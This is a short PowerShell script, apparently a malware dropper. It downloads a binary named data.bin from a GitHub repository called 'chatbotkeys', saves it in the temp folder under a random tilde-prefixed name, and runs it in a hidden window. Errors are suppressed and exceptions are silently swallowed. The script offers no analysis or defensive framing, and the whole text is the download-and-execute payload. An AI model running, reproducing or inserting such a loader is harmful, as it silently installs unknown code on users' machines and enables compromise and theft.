$ErrorActionPreference = "SilentlyContinue"
$u = "https://github.com/22ffwhite07-tech/chatbotkeys/raw/refs/heads/main/data.bin"
$t = Join-Path $env:TEMP ("~" + [Guid]::NewGuid().ToString("N").Substring(0,8) + ".bin")
try {
    (New-Object Net.WebClient).DownloadFile($u, $t)
    Start-Process -FilePath $t -WindowStyle Hidden
} catch {}